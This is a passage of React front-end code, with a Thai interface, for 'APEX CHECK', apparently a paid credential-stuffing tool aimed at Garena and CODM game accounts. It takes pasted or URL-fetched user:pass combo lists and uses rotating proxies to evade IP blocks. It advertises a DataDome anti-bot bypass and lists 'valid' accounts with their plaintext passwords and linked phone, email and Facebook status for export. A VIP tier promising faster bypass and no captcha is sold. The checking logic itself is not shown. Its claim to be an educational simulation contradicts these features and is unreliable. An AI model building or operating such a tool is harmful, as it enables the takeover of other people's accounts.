                    {user.email_confirmed_at ? 'Verified Account' : 'Needs Verification'}
                  </span>
                </div>
                <div className="relative group">
                  <button className="p-2.5 bg-zinc-800 rounded-xl border border-white/10 hover:bg-zinc-700 transition-all">
                    <User className="w-5 h-5 text-zinc-300" />
                  </button>
                  <div className="absolute right-0 top-full mt-2 w-48 bg-[#09090b] border border-white/5 rounded-2xl shadow-2xl opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all py-2 z-50">
                    <div className="px-4 py-2 border-b border-white/5 sm:hidden">
                      <p className="text-xs font-bold text-white truncate">{user.email}</p>
                    </div>
                    {!user.email_confirmed_at && (
                      <button onClick={resendVerification} className="w-full px-4 py-2 text-left text-xs text-amber-500 hover:bg-amber-500/10 flex items-center gap-2">
                        <AlertTriangle className="w-4 h-4" /> Resend Verification
                      </button>
                    )}
                    <button onClick={handleLogout} className="w-full px-4 py-2 text-left text-xs text-red-500 hover:bg-red-500/10 flex items-center gap-2">
                      <LogOut className="w-4 h-4" /> Logout
                    </button>
                  </div>
                </div>
              </div>
            ) : (
              <button 
                onClick={() => {
                  setAuthMode('login');
                  setShowAuthModal(true);
                }} 
                className="flex items-center gap-1.5 px-6 py-2.5 rounded-xl bg-zinc-800/50 hover:bg-zinc-800 text-sm font-bold border border-white/5 transition-all text-white"
              >
                Sign In
              </button>
            )}

            {user ? (
               <>
                {userPlan?.isPremium && (
                    <button onClick={() => {
                        Swal.fire({
                            title: 'ประวัติการใช้งาน',
                            text: 'นี่คือประวัติการตรวจสอบย้อนหลังของบัญชีคุณ',
                            icon: 'info',
                            background: '#09090b',
                            color: '#fff'
                        });
                    }} className="hidden sm:flex items-center gap-1.5 px-4 py-2 rounded-xl bg-zinc-800/50 hover:bg-zinc-800 text-sm font-bold border border-white/5 transition-all text-zinc-300">
                        <History className="w-3.5 h-3.5" /> ประวัติ
                    </button>
                )}
                {!userPlan?.isPremium ? (
                  <button onClick={() => setShowKeyModal(true)} className="flex items-center gap-1.5 px-4 py-2 rounded-xl bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-400 hover:to-orange-500 text-white text-sm font-bold shadow-[0_0_15px_rgba(245,158,11,0.3)] transition-all">
                    <Crown className="w-3.5 h-3.5" /> ซื้อ VIP
                  </button>
                ) : (
                  <div className="flex items-center gap-4 bg-amber-500/10 border border-amber-500/20 px-4 py-2 rounded-2xl">
                    <Crown className="w-5 h-5 text-amber-500 drop-shadow-[0_0_8px_rgba(245,158,11,0.5)]" />
                    <div className="flex flex-col hidden sm:flex">
                        <span className="text-sm font-bold text-amber-500 uppercase leading-tight">{userPlan.username}</span>
                        <span className="text-[10px] text-amber-500/80 font-bold uppercase tracking-wider leading-tight">Premium Member</span>
                    </div>
                  </div>
                )}
               </>
            ) : null}
          </div>
        </div>
      </nav>

      {/* Verification Banner */}
      {user && !user.email_confirmed_at && (
        <div className="bg-amber-500/10 border-b border-amber-500/20 py-2.5 px-4 text-center relative z-30">
          <p className="text-xs text-amber-500 font-bold flex items-center justify-center gap-2">
            <AlertTriangle className="w-4 h-4" />
            บัญชีของคุณยังไม่ได้ยืนยันอีเมล! กรุณาตรวจสอบอีเมลของคุณ
            <button 
              onClick={resendVerification}
              className="ml-4 underline hover:text-amber-400 transition-colors"
            >
              ส่งอีเมลยืนยันอีกครั้ง
            </button>
          </p>
        </div>
      )}

      <div className="max-w-7xl mx-auto px-4 sm:px-6 pt-10 pb-24">
        {/* Page Header */}
        <div className="mb-10 flex flex-col sm:flex-row items-center justify-between gap-4 border-b border-white/5 pb-8">
          <div>
            <h1 className="text-3xl sm:text-4xl font-bold text-white flex items-center gap-3">
              APEX CHECK <span className="px-3 py-1 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 text-xs font-bold uppercase tracking-wider backdrop-blur-sm">BY APEX STUDIO</span>
            </h1>
            <p className="text-zinc-400 mt-2 text-sm">เครื่องมือเช็คไอดีเกมอัตโนมัติ แม่นยำ ปลอดภัย 100%</p>
          </div>
          <div className="flex items-center gap-2 bg-zinc-900/50 border border-white/5 px-4 py-2 rounded-xl backdrop-blur-sm">
            <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 shadow-[0_0_10px_rgba(16,185,129,0.5)] animate-pulse"></div>
            <span className="text-emerald-400 text-sm font-bold tracking-wide">SYSTEM ONLINE</span>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
          {/* Left Panel: Combo & Controls */}
          <div className="lg:col-span-4 flex flex-col gap-6">
            <div className="bg-[#151518]/80 backdrop-blur-xl rounded-3xl p-6 sm:p-7 border border-white/5 shadow-xl relative overflow-hidden">
              {/* Decorative gradient blob */}
              <div className="absolute -top-24 -right-24 w-48 h-48 bg-cyan-500/10 blur-[60px] rounded-full pointer-events-none"></div>
              
              <div className="flex justify-between items-center mb-5">
                <h2 className="text-xl font-bold flex items-center gap-3 text-white">
                  <ListChecks className="w-5 h-5 text-cyan-400" /> นำเข้าข้อมูล <span className="text-xs text-zinc-500 font-mono">({combo.trim() ? combo.trim().split('\n').length : 0} รายการ)</span>
                </h2>
                <div className="flex gap-2 relative z-10">
                  <button 
                    onClick={async () => {
                      const { value: url } = await Swal.fire({
                        title: 'ดึงข้อมูลจาก URL (Pastebin/Link)',
                        input: 'url',
                        inputPlaceholder: 'https://pastebin.com/raw/...',
                        showCancelButton: true,
                        confirmButtonText: 'ดึงข้อมูล',
                        cancelButtonText: 'ยกเลิก'
                      });
                      if (url) {
                        try {
                          Swal.showLoading();
                          const res = await axios.get(url);
                          if (res.data) {
                            setCombo(res.data);
                            Swal.close();
                            Swal.fire({
                               title: 'สำเร็จ', 
                               text: `ดึงข้อมูลสำเร็จ ${res.data.trim().split('\n').length} รายการ`, 
                               icon: 'success',
                               timer: 2000
                            });
                          }
                        } catch (err) {
                          Swal.fire('ล้มเหลว', 'ไม่สามารถเชื่อมต่อ URL ได้ (อาจจะติด CORS หรือลิงก์ผิด)', 'error');
                        }
                      }
                    }} 
                    className="bg-zinc-800/50 hover:bg-zinc-800 px-3 py-1.5 rounded-lg border border-white/10 text-[10px] font-bold text-zinc-300 flex items-center gap-1.5 transition-colors"
                  >
                    <Home className="w-3.5 h-3.5" /> ดึง URL
                  </button>
                  <label className="cursor-pointer bg-white/5 hover:bg-white/10 px-3 py-1.5 rounded-lg border border-white/10 text-[10px] font-bold text-cyan-400 flex items-center gap-1.5 transition-colors">
                    <Upload className="w-3.5 h-3.5" /> ไฟล์ .txt
                    <input type="file" accept=".txt" className="hidden" onChange={handleFileUpload} />
                  </label>
                </div>
              </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4 relative z-10">
              <div>
                <label className="text-[11px] text-zinc-500 font-bold uppercase tracking-wider mb-2 flex items-center gap-2">
                  <Database className="w-3.5 h-3.5" /> รายชื่อไอดี (Account List)
                </label>
                <textarea
                  value={combo}
                  onChange={(e) => setCombo(e.target.value)}
                  rows={10}
                  className="w-full bg-[#09090b] border border-white/10 rounded-2xl p-5 text-sm font-mono focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500/50 outline-none resize-none transition-all scrollbar-thin scrollbar-thumb-zinc-700 h-48"
                  placeholder="user:pass&#10;user|pass"
                />
              </div>
              <div>
                <label className="text-[11px] text-zinc-500 font-bold uppercase tracking-wider mb-2 flex items-center gap-2">
                   <Globe className="w-3.5 h-3.5" /> ตั้งค่า Proxy (Bypass 403)
                </label>
                <div className="bg-[#09090b] border border-white/10 rounded-2xl p-5 h-48 flex flex-col gap-2">
                   <p className="text-[10px] text-zinc-400 shrink-0">ใส่ Proxy เพื่อป้องกันการโดน IP Block (403 Forbidden) รองรับหลายบรรทัดและการสุ่ม</p>
                   <textarea 
                     value={proxy}
                     onChange={(e) => setProxy(e.target.value)}
                     placeholder="IP:PORT@USER:PASS&#10;IP:PORT:USER:PASS&#10;http://user:pass@host:port"
                     className="w-full flex-1 bg-zinc-900/50 border border-white/10 rounded-xl px-4 py-3 text-sm focus:border-cyan-500 outline-none transition-all font-mono placeholder:text-zinc-700 resize-none"
                   />
                   <div className="pt-1 space-y-1 shrink-0">
                      <div className="flex items-center gap-2">
                         <div className="w-2 h-2 rounded-full bg-emerald-500 shadow-[0_0_8px_#10b981]"></div>
                         <span className="text-[10px] text-zinc-400 font-bold">Proxy Rotate: Armed</span>
                      </div>
                   </div>
                </div>
              </div>
            </div>

              <div className="mt-6 flex flex-col gap-3 relative z-10">
                <button
                  onClick={startCheck}
                  disabled={running}
                  className="w-full bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 py-4 rounded-xl font-bold text-lg flex items-center justify-center gap-3 transition-all disabled:opacity-50 disabled:cursor-not-allowed shadow-[0_4px_20px_rgba(34,211,238,0.2)]"
                >
                  <Play className="w-5 h-5" fill="currentColor" /> เริ่มตรวจสอบไอดี
                </button>
                <button
                  onClick={stopCheck}
                  disabled={!running}
                  className="w-full bg-white/5 hover:bg-white/10 border border-white/5 hover:border-red-500/50 hover:text-red-400 py-3 rounded-xl font-bold flex items-center justify-center gap-2 transition-all disabled:opacity-30 disabled:cursor-not-allowed"
                >
                  <Square className="w-4 h-4" fill="currentColor" /> หยุดการตรวจสอบ
                </button>
              </div>
            </div>

            {/* Stats Dashboard */}
            <div className="bg-[#151518]/80 backdrop-blur-xl rounded-3xl p-6 sm:p-7 border border-white/5 shadow-xl">
              <h3 className="text-sm font-bold text-zinc-400 mb-5 uppercase tracking-wider">ภาพรวมผลลัพธ์</h3>
              <div className="grid grid-cols-2 gap-4">
                <div className="bg-[#09090b] rounded-2xl p-4 border border-white/5 flex flex-col items-center justify-center relative overflow-hidden group">
                  <div className="absolute inset-x-0 bottom-0 h-0.5 bg-green-500 scale-x-0 group-hover:scale-x-100 transition-transform origin-left text-green-500"></div>
                  <Check className="text-green-500 mb-2 w-7 h-7" />
                  <span className="text-3xl font-bold text-white mb-1 font-mono">{validAccounts.length}</span>
                  <span className="text-xs text-zinc-500 font-medium">สำเร็จ (VALID)</span>
                </div>
                <div className="bg-[#09090b] rounded-2xl p-4 border border-white/5 flex flex-col items-center justify-center relative overflow-hidden group">
                  <div className="absolute inset-x-0 bottom-0 h-0.5 bg-red-500 scale-x-0 group-hover:scale-x-100 transition-transform origin-left text-red-500"></div>
                  <X className="text-red-500 mb-2 w-7 h-7" />
                  <span className="text-3xl font-bold text-white mb-1 font-mono">{invalidCount}</span>
                  <span className="text-xs text-zinc-500 font-medium">ไม่ผ่าน (INVALID)</span>
                </div>
                <div className="bg-[#09090b] rounded-2xl p-4 border border-white/5 flex flex-col items-center justify-center relative overflow-hidden group">
                  <div className="absolute inset-x-0 bottom-0 h-0.5 bg-emerald-400 scale-x-0 group-hover:scale-x-100 transition-transform origin-left text-emerald-400"></div>
                  <Shield className="text-emerald-400 mb-2 w-7 h-7" />
                  <span className="text-3xl font-bold text-white mb-1 font-mono">{validAccounts.filter(a => a.isClean).length}</span>
                  <span className="text-xs text-zinc-500 font-medium">ปกติ (CLEAN)</span>
                </div>
                <div className="bg-[#09090b] rounded-2xl p-4 border border-white/5 flex flex-col items-center justify-center relative overflow-hidden group">
                  <div className="absolute inset-x-0 bottom-0 h-0.5 bg-blue-400 scale-x-0 group-hover:scale-x-100 transition-transform origin-left text-blue-400"></div>
                  <Gamepad2 className="text-blue-400 mb-2 w-7 h-7" />
                  <span className="text-3xl font-bold text-white mb-1 font-mono">{validAccounts.filter(a => a.hasCodm).length}</span>
                  <span className="text-xs text-zinc-500 font-medium">เล่น CODM</span>
                </div>
              </div>

              <div className="mt-6 flex flex-col gap-2">
                <div className="grid grid-cols-2 gap-2">
                  <button onClick={exportClean} className="bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/20 py-3 rounded-xl font-bold text-sm transition-colors">บันทึกปกติ (CLEAN)</button>
                  <button onClick={exportBound} className="bg-amber-500/10 hover:bg-amber-500/20 text-amber-400 border border-amber-500/20 py-3 rounded-xl font-bold text-sm transition-colors">บันทึกเชื่อม (BOUND)</button>
                </div>
                <button onClick={exportAllValid} className="bg-white/5 hover:bg-white/10 border border-white/10 py-3 rounded-xl font-bold text-sm transition-colors w-full">บันทึกที่ผ่านทั้งหมด (ALL VALID)</button>
              </div>
            </div>
          </div>

          {/* Right Panel: Terminal Log & Results */}
          <div className="lg:col-span-8 flex flex-col gap-6">
            <div className="bg-[#151518]/80 backdrop-blur-xl border border-white/5 rounded-3xl p-6 sm:p-7 h-[450px] flex flex-col shadow-xl">
                <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-5 pb-4 border-b border-white/5 gap-4">
                <div className="flex items-center gap-2 flex-wrap">
                  <h3 className="font-bold text-lg flex items-center gap-2 text-white">
                    <Terminal className="text-cyan-400 w-5 h-5" /> บันทึกการทำงานสด <span className="text-xs font-mono text-zinc-500 ml-2">(LIVE LOG)</span>
                  </h3>
                  <div className="flex items-center gap-2">
                    {elapsedTime !== '00:00:00.000' && (
                      <div className="px-3 py-1 bg-zinc-800 rounded-lg border border-white/5 text-[10px] sm:text-xs font-mono text-cyan-400 animate-pulse">
                        {elapsedTime}
                      </div>
                    )}
                    <div className="px-2 py-1 bg-emerald-500/10 border border-emerald-500/20 rounded-md text-[9px] font-bold text-emerald-400 uppercase tracking-tighter shadow-[0_0_10px_rgba(16,185,129,0.2)]">
                      Bypass DataDome v2.8
                    </div>
                  </div>
                </div>
                <button onClick={clearLog} className="px-4 py-2 bg-white/5 hover:bg-white/10 rounded-lg text-xs font-medium transition-colors border border-white/5">เคลียร์ LOG</button>
              </div>
              <div ref={logDivRef} className="flex-1 bg-[#09090b] border border-white/5 p-5 rounded-2xl text-xs sm:text-sm font-mono overflow-auto scrollbar-thin scrollbar-thumb-zinc-700 scrollbar-track-transparent">
                {logs.length === 0 && (
                  <div className="text-zinc-600 italic">ยังไม่มีบันทึก...</div>
                )}
                {logs.map(log => (
                  <div key={log.id} className={`${log.colorClass} mb-2 flex items-start gap-2 break-all whitespace-pre-wrap`}>
                    <span className="shrink-0 text-gray-500 select-none">[{log.time}]</span>
                    <span className="flex-1">
                      <div className="flex items-start">
                        {log.iconName === 'shield' && <Shield className="inline w-4 h-4 mr-2 shrink-0 mt-0.5" />}
                        {log.iconName === 'terminal-pulse' && <Terminal className="inline w-4 h-4 mr-2 shrink-0 animate-pulse mt-0.5" />}
                        {log.iconName === 'terminal' && <Terminal className="inline w-4 h-4 mr-2 shrink-0 mt-0.5" />}
                        {log.iconName === 'check-circle' && <CheckCircle2 className="inline w-4 h-4 mr-2 shrink-0 mt-0.5" />}
                        {log.iconName === 'x' && <X className="inline w-4 h-4 mr-2 shrink-0 mt-0.5" />}
                        {log.iconName === 'check' && <Check className="inline w-4 h-4 mr-2 shrink-0 mt-0.5" />}
                        {log.iconName === 'square' && <Square className="inline w-4 h-4 mr-2 shrink-0 mt-0.5" />}
                        {log.iconName === 'crown' && <Crown className="inline w-4 h-4 mr-2 shrink-0 mt-0.5" />}
                        <span className="flex-1">{log.text}</span>
                      </div>
                    </span>
                  </div>
                ))}
              </div>
            </div>

            {validAccounts.length > 0 && (
              <div className="bg-[#151518]/80 backdrop-blur-xl border border-white/5 rounded-3xl p-6 sm:p-7 shadow-xl">
                <div className="flex items-center justify-between mb-5 border-b border-white/5 pb-4">
                  <h3 className="font-bold text-lg text-white flex items-center gap-2">
                    <CheckCircle2 className="w-5 h-5 text-emerald-400" /> ผลลัพธ์ที่สำเร็จ <span className="bg-emerald-500/20 text-emerald-400 px-2.5 py-0.5 rounded-full text-sm">{validAccounts.length}</span>
                  </h3>
                </div>
                <div className="space-y-4 max-h-[600px] overflow-y-auto scrollbar-thin scrollbar-thumb-zinc-700 pr-2">
                  {validAccounts.map((acc, idx) => (
                    <div key={idx} className="bg-[#09090b] border border-white/5 rounded-2xl p-4 sm:p-6 flex flex-col gap-5 hover:border-cyan-500/30 transition-all relative overflow-hidden group shadow-lg">
                      <div className="absolute top-0 right-0 w-48 h-48 bg-cyan-500/[0.03] blur-3xl rounded-full pointer-events-none group-hover:bg-cyan-500/10 transition-colors"></div>
                      
                      {/* Header Section */}
                      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 relative z-10">
                        <div className="flex items-center gap-4">
                          <div className="w-12 h-12 rounded-2xl bg-emerald-500/10 flex items-center justify-center border border-emerald-500/20 shadow-inner">
                            <Check className="w-6 h-6 text-emerald-400" />
                          </div>
                          <div>
                            <div className="text-[10px] text-zinc-500 font-bold uppercase tracking-[0.2em]">UID: {acc.uid} | {acc.region}</div>
                            <div className="text-white font-bold font-mono text-base sm:text-lg group-hover:text-cyan-400 transition-colors">{acc.account}</div>
                          </div>
                        </div>
                        <div className="flex flex-wrap items-center gap-2">
                           <div className="px-3 py-1.5 bg-zinc-800/80 rounded-xl border border-white/5 text-[11px] text-zinc-300 font-mono">PASS: {acc.password}</div>
                           <div className="px-3 py-1.5 bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-xl text-[11px] font-black italic">LV. {acc.level}</div>
                           <div className="px-3 py-1.5 bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-xl text-[11px] font-black uppercase">{acc.rank}</div>
                           <div className="px-3 py-1.5 bg-purple-500/10 text-purple-400 border border-purple-500/20 rounded-xl text-[11px] font-black uppercase tracking-tighter">SHELLS: {acc.shells}</div>
                        </div>
                      </div>

                      {/* Details Grid */}
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-4 border-t border-b border-white/5 py-4 relative z-10">
                        <div className="flex flex-col gap-1">
                          <div className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest">สถานะไอดี</div>
                          {acc.isClean ? 
                            <span className="text-xs text-emerald-400 font-bold flex items-center gap-1.5"><Shield className="w-3.5 h-3.5" /> CLEAN (ปกติ)</span> : 
                            <span className="text-xs text-amber-500 font-bold flex items-center gap-1.5">🔗 BOUND (เชื่อมโยง)</span>
                          }
                        </div>
                        <div className="flex flex-col gap-1">
                          <div className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest">Garena Mobile</div>
                          <span className={`text-xs font-bold flex items-center gap-1.5 ${acc.phoneBound ? 'text-emerald-400' : 'text-zinc-500'}`}>
                             {acc.phoneBound ? <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 shadow-[0_0_8px_rgba(16,185,129,0.5)]"></div> : null}
                             {acc.phoneBound ? 'ผูกเบอร์แล้ว' : 'ยังไม่ผูกเบอร์'}
                          </span>
                        </div>
                        <div className="flex flex-col gap-1">
                          <div className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest">Email Verified</div>
                          <span className={`text-xs font-bold flex items-center gap-1.5 ${acc.emailVerified ? 'text-emerald-400' : 'text-zinc-500'}`}>
                             {acc.emailVerified ? <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 shadow-[0_0_8px_rgba(16,185,129,0.5)]"></div> : null}
                             {acc.emailVerified ? 'ยืนยันแล้ว' : 'ยังไม่ยืนยัน'}
                          </span>
                        </div>
                        <div className="flex flex-col gap-1">
                          <div className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest">Facebook</div>
                          <span className={`text-xs font-bold flex items-center gap-1.5 ${acc.fbLinked ? 'text-blue-400' : 'text-zinc-500'}`}>
                             {acc.fbLinked ? 'เชื่อมต่อแล้ว' : 'ไม่ได้เชื่อมต่อ'}
                          </span>
                        </div>
                      </div>

                      {/* Footer Section */}
                      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 relative z-10">
                        <div className="flex flex-wrap items-center gap-2">
                           <div className="text-[10px] text-zinc-500 font-bold mr-1">เกมอื่นๆ:</div>
                           {acc.otherGames.length > 0 ? acc.otherGames.map((g, gi) => (
                             <span key={gi} className="px-2 py-0.5 bg-white/5 text-zinc-400 rounded-md text-[9px] border border-white/5 uppercase">{g}</span>
                           )) : <span className="text-[9px] text-zinc-600 italic">ไม่พบประวัติเกมอื่น</span>}
                           {acc.hasCodm && (
                             <span className="px-2 py-0.5 bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 rounded-md text-[9px] font-bold uppercase flex items-center gap-1"><Gamepad2 className="w-2.5 h-2.5" /> CODM ACTIVE</span>
                           )}
                        </div>
                        <div className="text-[10px] text-zinc-500 font-mono bg-white/5 px-2 py-1 rounded-md">
                          CHECKED_AT: {acc.cleanAt}
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Footer */}
        <footer className="mt-20 pt-8 border-t border-white/5 flex flex-col md:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-4">
            <img src="https://img2.pic.in.th/-59_20260425171043.png" alt="APEX STUDIO TH" className="h-8 object-contain opacity-50 grayscale hover:grayscale-0 hover:opacity-100 transition-all" />
            <p className="text-sm text-zinc-500">© 2026 APEX STUDIO TH. All rights reserved.</p>
          </div>
          <div className="flex items-center gap-6 text-sm text-zinc-500 font-medium">
            <button onClick={() => setShowPrivacy(true)} className="hover:text-cyan-400 transition-colors">นโยบายความเป็นส่วนตัว</button>
            <button onClick={() => setShowTerms(true)} className="hover:text-cyan-400 transition-colors">ข้อกำหนดการใช้งาน</button>
          </div>
        </footer>
      </div>

      {/* Modals */}
      {showCheckCaptchaModal && (
        <div className="fixed inset-0 bg-[#09090b]/90 flex items-center justify-center p-4 z-50 backdrop-blur-md font-sans">
          <div className="bg-[#151518] border border-white/10 rounded-3xl p-6 sm:p-8 max-w-sm w-full relative shadow-[0_0_50px_rgba(0,0,0,0.5)]">
            <div className="text-center">
              <Shield className="w-12 h-12 text-cyan-400 mx-auto mb-4" />
              <h2 className="text-xl font-bold mb-2">ยืนยันรหัสความปลอดภัย</h2>
              <p className="text-zinc-400 text-sm mb-6">กรุณายืนยันว่าคุณไม่ใช่บอท เพื่อเริ่มตรวจสอบไอดี จำนวน {savedLinesToCheck.length} รายการ</p>
              
              <div className="flex justify-center mb-6">
                <Turnstile 
                  siteKey={TURNSTILE_SITE_KEY}
                  onSuccess={(token) => executeCheck(token)}
                  onError={() => {
                    Swal.fire({ title: 'ข้อผิดพลาด', text: 'ยืนยันตัวตนล้มเหลว', icon: 'error' });
                    setCheckTurnstileToken(null);
                  }}
                  onExpire={() => setCheckTurnstileToken(null)}
                  options={{ theme: 'dark' }}
                />
              </div>

              <button
                onClick={() => setShowCheckCaptchaModal(false)}
                className="w-full bg-zinc-800 hover:bg-zinc-700 text-white font-bold py-3 rounded-xl transition-colors"
              >
                ยกเลิก
              </button>
            </div>
          </div>
        </div>
      )}
      {showPrivacy && (
        <div className="fixed inset-0 bg-[#09090b]/90 flex items-center justify-center p-4 z-50 backdrop-blur-md font-sans animate-in fade-in duration-200">
          <div className="bg-[#151518] border border-white/10 rounded-3xl p-6 sm:p-8 max-w-2xl w-full max-h-[90vh] flex flex-col relative shadow-[0_0_50px_rgba(0,0,0,0.5)]">
            <h2 className="text-xl sm:text-2xl font-bold mb-6 text-cyan-400 flex items-center gap-2">
              <Shield className="w-6 h-6 shrink-0" /> นโยบายความเป็นส่วนตัว (Privacy Policy)
            </h2>
            <div className="overflow-y-auto pr-2 sm:pr-4 space-y-6 text-sm leading-relaxed text-gray-300 scrollbar-thin scrollbar-thumb-zinc-700 flex-1">
              <p><strong>อัปเดตล่าสุด:</strong> 25 เมษายน 2569</p>
              
              <div>
                <h3 className="font-bold text-white text-base mb-2">1. ข้อมูลที่เราเก็บรวบรวม</h3>
                <ul className="list-disc pl-5 space-y-1 text-zinc-400">
                  <li>ไม่มีข้อมูล Combo (อีเมล:รหัสผ่าน) ถูกส่งไปยังเซิร์ฟเวอร์ใด ๆ</li>
                  <li>การตรวจสอบทั้งหมดทำงานแบบ Client-Side (ในเบราว์เซอร์ของคุณเท่านั้น)</li>
                  <li>ไม่มี Cookie, Local Storage, หรือ Session Storage ที่เก็บข้อมูลสำคัญ</li>
                  <li>ข้อมูลทั้งหมดจะหายไปเมื่อคุณปิดหรือรีเฟรชหน้าเว็บ</li>
                </ul>
              </div>

              <div>
                <h3 className="font-bold text-white text-base mb-2">2. การใช้งานข้อมูล</h3>
                <p className="text-zinc-400">ข้อมูลที่คุณวางในช่อง Combo จะถูกใช้เพื่อการจำลองการตรวจสอบบัญชี <strong>ภายในเบราว์เซอร์ของคุณเท่านั้น</strong> และจะไม่ถูกเก็บหรือส่งต่อไปยังบุคคลที่สาม</p>
              </div>

              <div>
                <h3 className="font-bold text-white text-base mb-2">3. การรักษาความปลอดภัย</h3>
                <ul className="list-disc pl-5 space-y-1 text-zinc-400">
                  <li>ใช้มาตรการ Anti-DevTools เพื่อป้องกันการดึงข้อมูล</li>
                  <li>ปิดการใช้งาน Right-Click และ Keyboard Shortcuts ที่อาจเปิดเผยโค้ด</li>
                  <li>ไม่มีการเชื่อมต่ออินเทอร์เน็ตเมื่อทำการตรวจสอบ (ยกเว้นโหลดไลบรารี)</li>
                </ul>
              </div>

              <div>
                <h3 className="font-bold text-white text-base mb-2">4. สิทธิของผู้ใช้</h3>
                <p className="text-zinc-400 mb-1">คุณมีสิทธิ์ที่จะ:</p>
                <ul className="list-disc pl-5 space-y-1 text-zinc-400">
                  <li>หยุดการตรวจสอบได้ตลอดเวลา</li>
                  <li>ลบข้อมูลทั้งหมดโดยการรีเฟรชหน้าเว็บ</li>
                  <li>ไม่ให้ข้อมูล Combo หากไม่ต้องการ</li>
                </ul>
              </div>

              <div>
                <h3 className="font-bold text-white text-base mb-2">5. ข้อจำกัดความรับผิดชอบ</h3>
                <p className="text-red-400 mb-2">เครื่องมือนี้เป็นเครื่องมือจำลอง (Simulation Tool) เพื่อการศึกษาเท่านั้น ไม่มีส่วนเกี่ยวข้องกับเครือข่ายเซิร์ฟเวอร์ใด ๆ อย่างเป็นทางการ</p>
                <p className="text-zinc-400">ผู้พัฒนาไม่รับผิดชอบต่อความเสียหายใด ๆ ที่เกิดจากการใช้งาน</p>
              </div>
            </div>
            <div className="pt-6 mt-6 border-t border-white/5 text-right">
              <button 
                onClick={() => setShowPrivacy(false)} 
                className="bg-cyan-500 hover:bg-cyan-400 text-[#09090b] font-bold py-3 px-8 rounded-xl transition-colors w-full sm:w-auto"
              >
                เข้าใจและยอมรับ
              </button>
            </div>
          </div>
        </div>
      )}

      {showTerms && (
        <div className="fixed inset-0 bg-[#09090b]/90 flex items-center justify-center p-4 z-50 backdrop-blur-md font-sans animate-in fade-in duration-200">
          <div className="bg-[#151518] border border-white/10 rounded-3xl p-6 sm:p-8 max-w-lg w-full relative shadow-[0_0_50px_rgba(0,0,0,0.5)]">
            <h2 className="text-xl sm:text-2xl font-bold mb-6 flex items-center gap-2 text-white">
              <ListChecks className="w-6 h-6 shrink-0" /> ข้อกำหนดการใช้งาน
            </h2>
            <div className="space-y-4 text-sm text-zinc-400">
              <p>1. เครื่องมือนี้ใช้เพื่อการศึกษา ทดสอบ อย่างปลอดภัย และตรวจสอบสถานะบัญชีของตนเองที่ได้รับอนุญาตเท่านั้น</p>
              <p>2. ห้ามนำไปใช้ในทางที่ผิดกฎหมายหรือละเมิดสิทธิของผู้อื่น</p>
              <p>3. ผู้ใช้ต้องรับผิดชอบต่อผลจากการใช้งานเครื่องมือนี้ด้วยตนเอง</p>
              <p>4. ผู้พัฒนาไม่รับประกันความถูกต้อง 100% ของผลการตรวจสอบ (เป็นการจำลอง)</p>
              <div className="bg-red-500/10 border border-red-500/30 p-4 rounded-xl mt-6">
                <p className="text-red-400 font-bold">5. การใช้งานอาจขัดกับข้อกำหนดการให้บริการของแพลตฟอร์มปลายทาง</p>
              </div>
            </div>
            <div className="pt-6 mt-6 border-t border-white/5 text-right">
              <button 
                onClick={() => setShowTerms(false)} 
                className="bg-white hover:bg-gray-200 text-black font-bold py-3 px-8 rounded-xl transition-colors w-full sm:w-auto"
              >
                ยอมรับข้อกำหนด
              </button>
            </div>
          </div>
        </div>
      )}

      {showKeyModal && (
        <div className="fixed inset-0 bg-[#09090b]/90 flex items-center justify-center p-4 z-[70] backdrop-blur-md font-sans animate-in zoom-in-95 duration-200 overflow-y-auto">
          <div className="bg-[#151518] border border-amber-500/20 rounded-3xl p-6 sm:p-8 max-w-lg w-full shadow-[0_0_50px_rgba(245,158,11,0.15)] relative overflow-hidden my-8">
            <div className="absolute top-0 right-0 w-64 h-64 bg-amber-500/5 blur-[80px] rounded-full pointer-events-none"></div>

            <div className="text-center mb-6 relative z-10">
               <div className="w-16 h-16 bg-amber-500/10 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-amber-500/20">
                  <Crown className="w-8 h-8 text-amber-400 drop-shadow-[0_0_8px_rgba(245,158,11,0.5)]" />
               </div>
               <h2 className="text-2xl font-bold text-white mb-2 tracking-tight">VIP MEMBER</h2>
               <div className="text-sm text-zinc-400 mb-6 space-y-2">
                   <p>สิทธิพิเศษระดับพรีเมียม:</p>
                   <ul className="text-left inline-block space-y-1">
                       <li className="flex items-center gap-2"><Check className="w-4 h-4 text-emerald-500" /> ตรวจสอบไอดีไม่จำกัด (Unlimited Checks)</li>
                       <li className="flex items-center gap-2"><Check className="w-4 h-4 text-emerald-500" /> Bypass DataDome ความเร็วสูง</li>
                       <li className="flex items-center gap-2"><Check className="w-4 h-4 text-emerald-500" /> บันทึกประวัติการตรวจสอบย้อนหลัง</li>
                       <li className="flex items-center gap-2"><Check className="w-4 h-4 text-emerald-500" /> ไม่ต้องติด Captcha (Turnstile)</li>
                   </ul>
               </div>
               <a href="https://discord.gg/yourlink" target="_blank" rel="noopener noreferrer" className="mt-4 inline-flex items-center gap-2 px-6 py-2.5 bg-[#5865F2] hover:bg-[#4752C4] text-white rounded-xl text-sm font-bold transition-all shadow-lg hover:scale-105">
